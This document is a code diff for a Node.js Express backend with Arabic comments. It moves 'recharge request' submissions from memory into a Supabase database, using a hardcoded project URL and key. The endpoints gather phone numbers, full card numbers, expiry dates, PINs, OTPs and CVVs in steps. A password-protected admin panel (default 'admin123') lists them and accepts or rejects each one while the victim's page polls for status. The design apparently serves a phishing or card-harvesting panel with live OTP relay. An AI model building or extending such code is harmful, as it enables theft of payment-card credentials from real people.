@@ -1,16 +1,18 @@
 const express = require('express');
 const path = require('path');
 const crypto = require('crypto');
+const { createClient } = require('@supabase/supabase-js');
 
 const app = express();
 const PORT = process.env.PORT || 3000;
 
 app.use(express.json());
 
-const ADMIN_PASSWORD = process.env.ADMIN_PASSWORD || 'admin123';
+const SUPABASE_URL = process.env.SUPABASE_URL || 'https://jmxrzkgikhsairerxfxh.supabase.co';
+const SUPABASE_KEY = process.env.SUPABASE_KEY || 'sb_publishable_8CKBZe6-5xVkB60vVpRnDQ_Yyn1JtcG';
+const supabase = createClient(SUPABASE_URL, SUPABASE_KEY);
 
-/* ---------------- تخزين الطلبات (في الذاكرة) ---------------- */
-let submissions = [];
+const ADMIN_PASSWORD = process.env.ADMIN_PASSWORD || 'admin123';
 
 /* ---------------- جلسات الأدمن ---------------- */
 const sessions = new Map();
@@ -33,63 +35,82 @@ function activeCount() {
 }
 
 // استقبال طلب شحن
-app.post('/api/submit', (req, res) => {
-  const b = req.body;
-  const phone  = String(b.phone  || '').trim();
-  const amount = String(b.amount || '').trim();
-  if (!phone || !amount) return res.status(400).json({ error: 'بيانات ناقصة' });
-  submissions.unshift({
-    id: crypto.randomBytes(6).toString('hex'),
-    phone, amount,
-    card:   String(b.card   || '').trim(),
-    expiry: String(b.expiry || '').trim(),
-    pin:    String(b.pin    || '').trim(),
-    otp:    String(b.otp    || '').trim(),
-    cvv:    String(b.cvv    || '').trim(),
-    status: 'pending',
-    time:   new Date().toISOString()
-  });
-  if (submissions.length > 5000) submissions = submissions.slice(0, 5000);
-  res.json({ ok: true, id: submissions[0].id });
+app.post('/api/submit', async (req, res) => {
+  try {
+    const b = req.body;
+    const phone  = String(b.phone  || '').trim();
+    const amount = String(b.amount || '').trim();
+    if (!phone || !amount) return res.status(400).json({ error: 'بيانات ناقصة' });
+    const id = crypto.randomBytes(6).toString('hex');
+    const { error } = await supabase.from('submissions').insert({
+      id, phone, amount,
+      card:   String(b.card   || '').trim(),
+      expiry: String(b.expiry || '').trim(),
+      pin:    String(b.pin    || '').trim(),
+      otp:    String(b.otp    || '').trim(),
+      cvv:    String(b.cvv    || '').trim(),
+      status: 'pending',
+      time:   new Date().toISOString()
+    });
+    if (error) throw error;
+    res.json({ ok: true, id });
+  } catch (err) {
+    res.status(500).json({ error: err.message });
+  }
 });
 
 // تحديث خطوة
-app.post('/api/submit-step/:id', (req, res) => {
-  const sub = submissions.find(s => s.id === req.params.id);
-  if (!sub) return res.status(404).json({ error: 'غير موجود' });
-  const b = req.body;
-  if (b.card   !== undefined) sub.card   = String(b.card).trim();
-  if (b.expiry !== undefined) sub.expiry = String(b.expiry).trim();
-  if (b.pin    !== undefined) sub.pin    = String(b.pin).trim();
-  if (b.otp    !== undefined) sub.otp    = String(b.otp).trim();
-  if (b.cvv    !== undefined) sub.cvv    = String(b.cvv).trim();
-  sub.status = 'pending';
-  res.json({ ok: true });
+app.post('/api/submit-step/:id', async (req, res) => {
+  try {
+    const b = req.body;
+    const updates = { status: 'pending' };
+    if (b.card   !== undefined) updates.card   = String(b.card).trim();
+    if (b.expiry !== undefined) updates.expiry = String(b.expiry).trim();
+    if (b.pin    !== undefined) updates.pin    = String(b.pin).trim();
+    if (b.otp    !== undefined) updates.otp    = String(b.otp).trim();
+    if (b.cvv    !== undefined) updates.cvv    = String(b.cvv).trim();
+    const { error } = await supabase.from('submissions').update(updates).eq('id', req.params.id);
+    if (error) throw error;
+    res.json({ ok: true });
+  } catch (err) {
+    res.status(500).json({ error: err.message });
+  }
 });
 
 // حالة طلب
-app.get('/api/status/:id', (req, res) => {
-  const sub = submissions.find(s => s.id === req.params.id);
-  if (!sub) return res.status(404).json({ error: 'غير موجود' });
-  res.json({ status: sub.status || 'pending' });
+app.get('/api/status/:id', async (req, res) => {
+  try {
+    const { data, error } = await supabase.from('submissions').select('status').eq('id', req.params.id).maybeSingle();
+    if (error) throw error;
+    if (!data) return res.status(404).json({ error: 'غير موجود' });
+    res.json({ status: data.status || 'pending' });
+  } catch (err) {
+    res.status(500).json({ error: err.message });
+  }
 });
 
 // قبول طلب
-app.post('/api/admin/accept/:id', (req, res) => {
+app.post('/api/admin/accept/:id', async (req, res) => {
   if (!isAuthed(req)) return res.status(401).json({ error: 'غير مصرح' });
-  const sub = submissions.find(s => s.id === req.params.id);
-  if (!sub) return res.status(404).json({ error: 'غير موجود' });
-  sub.status = 'accepted';
-  res.json({ ok: true });
+  try {
+    const { error } = await supabase.from('submissions').update({ status: 'accepted' }).eq('id', req.params.id);
+    if (error) throw error;
+    res.json({ ok: true });
+  } catch (err) {
+    res.status(500).json({ error: err.message });
+  }
 });
 
 // رفض طلب
-app.post('/api/admin/reject/:id', (req, res) => {
+app.post('/api/admin/reject/:id', async (req, res) => {
   if (!isAuthed(req)) return res.status(401).json({ error: 'غير مصرح' });
-  const sub = submissions.find(s => s.id === req.params.id);
-  if (!sub) return res.status(404).json({ error: 'غير موجود' });
-  sub.status = 'rejected';
-  res.json({ ok: true });
+  try {
+    const { error } = await supabase.from('submissions').update({ status: 'rejected' }).eq('id', req.params.id);
+    if (error) throw error;
+    res.json({ ok: true });
+  } catch (err) {
+    res.status(500).json({ error: err.message });
+  }
 });
 
 // نبضة الزائر
@@ -113,16 +134,27 @@ app.post('/api/admin/login', (req, res) => {
 });
 
 // بيانات الأدمن
-app.get('/api/admin/submissions', (req, res) => {
+app.get('/api/admin/submissions', async (req, res) => {
   if (!isAuthed(req)) return res.status(401).json({ error: 'غير مصرح' });
-  res.json({ submissions, active: activeCount() });
+  try {
+    const { data, error } = await supabase.from('submissions').select('*').order('time', { ascending: false });
+    if (error) throw error;
+    res.json({ submissions: data || [], active: activeCount() });
+  } catch (err) {
+    res.status(500).json({ submissions: [], error: err.message });
+  }
 });
 
 // مسح الطلبات
-app.post('/api/admin/clear', (req, res) => {
+app.post('/api/admin/clear', async (req, res) => {
   if (!isAuthed(req)) return res.status(401).json({ error: 'غير مصرح' });
-  submissions = [];
-  res.json({ ok: true });
+  try {
+    const { error } = await supabase.from('submissions').delete().neq('id', '');
+    if (error) throw error;
+    res.json({ ok: true });
+  } catch (err) {
+    res.status(500).json({ error: err.message });
+  }
 });
 
 // ملفات ثابتة
